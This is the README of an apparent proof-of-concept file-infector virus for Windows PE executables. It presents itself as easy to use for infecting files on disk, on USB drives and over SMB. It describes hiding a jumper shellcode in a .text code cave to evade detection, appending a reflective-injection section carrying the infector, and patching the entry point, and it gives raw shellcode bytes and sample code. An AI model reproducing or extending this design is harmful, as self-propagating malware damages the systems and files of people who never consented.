# FileInfector


## About

This project is a POC code, easy to use, for infecting PE files with a other executable code.
You can interact with this code to infect any files in the harddisk, monitor for USB plug ins and infect their executables, infect over SMB and more.

For now it only works for Native executables (written in CPP / C)

The code is written with custom std aims to lower the size of the executable!

## Infecting a File

The code executes the main function, whenever it infects a file it will infect it with the current main function! So you need to care about the main function can run in multiple files simultaneously.

For example I created a simple executable which pops a MessageBox, I changed the main function to Infect the specific file (you can also infect multiple files and wait for USB connections and more)

```cpp{.line-numbers}
int main()
{
    MessageBoxA(0, "", "INFECTED", 0);

    bool succeed = Infector::InfectFile(L"C:\\Users\\Yoav\\Desktop\\YoavTools\\_shared\\FileInfector\\x64\\Release\\MessageBox - Copy.exe");

    if (succeed)
    {
        MessageBoxA(0, "", "INFECTED2", 0);
    }

    return 0;
}
```

The 'MessageBox - Copy.exe' file was infected with our code, what is the code? whatever we want... right now it is the code running in the main function, which will try to infect it again (that will not work because there is a mechanism that checks whether the file was already infected).

Here we can see the difference between to normal and infected file sizes
![Difference Size](InfectedFileVsNormalFile.png)


Here we can see the normal file is executing
![Normal file executing](NormalFileRunning.png)

Here we can see that the infected file is being executed and first executing our main function, which pop ups a message box, then trying to infect the same file without success.
![Normal file executing](InfectedFileRunningTheInfectedCodeFirst.png)

## How it works

Let's have a look at the InfectFile, for now there is only support for the Native version without the dotnet version.

We first create a 13 bytes long shellcode that will jump to our other shellcode, why? so we can insert those 13 bytes shellcode to the `.text` section and avoid being easly detected (The entrypoint will still point to the `.text` section)

The entry shellcode is the following
```assembly
PUSH RAX // 0x50 - to align the stack to 16
CALL REL // 0xE8 <Relative address to the next shellcode>
POP RAX // 0x58
JMP REL // 0xE9 <Relative address for the old main function>
```

```cpp
unsigned char shellcodeJumper[13];
shellcodeJumper[0] = 0x50; // PUSH RAX - TO ALIGN STACK TO 16
shellcodeJumper[1] = 0xE8; // CALL REL
*reinterpret_cast<DWORD*>(&shellcodeJumper[2]) = 0x01234567; // Relative address of new main function
shellcodeJumper[sizeof(DWORD) + 2] = 0x58; // POP EAX - TO REARENGE THE STACK FRAME BACK
shellcodeJumper[sizeof(DWORD) + 3] = 0xE9; // JMP REL
*reinterpret_cast<DWORD*>(&shellcodeJumper[sizeof(DWORD) + 4]) = 0x89ABCDEF; // Relative address of old main function
```

Now we use some functions that helps us get the code to infect with, the code is the constant `.exp3` section and if not found it means that this is the main infector file! so we will get the whole PE file and add above it a reflective injection shellcode to make it PIC.

After we got the code to inject with, we need to check if the executable is already infected, it is done by checking if specific section (`.exp3`) exists.

Later we infect the executable which searches for a code cave in the `.text` section, add the shellcode jumper to it. adds another section header and a section to the PE file that contains the reflective shellcode injector and underneath it (literally) adds the infector PE file. It also changes the relative addresses of the shellcode jumper it created earlier, fixing some values in the PE header (AddressOfEntryPoint...) and then just saves the newly modified file!

```
.text
    normal code
    - code cave (shellcode jumper) -------->
    normal code                            |
                                           |
.exp3                                      |
                                  <--------
    [shellcode reflective injector - doing reflective injection on the code underneath it]  
    [The infector PE file - executing the main code]
    returns to the shellcode jumper - [which calls the original main after]

```

![Infected file vs Normal file section headers](InfectedFileVsNormalFileSectionHeaders.png)

![Infected file vs Normal file AddressOfEntry](InfectedFileVsNormalFileAddressOfEntry.png)
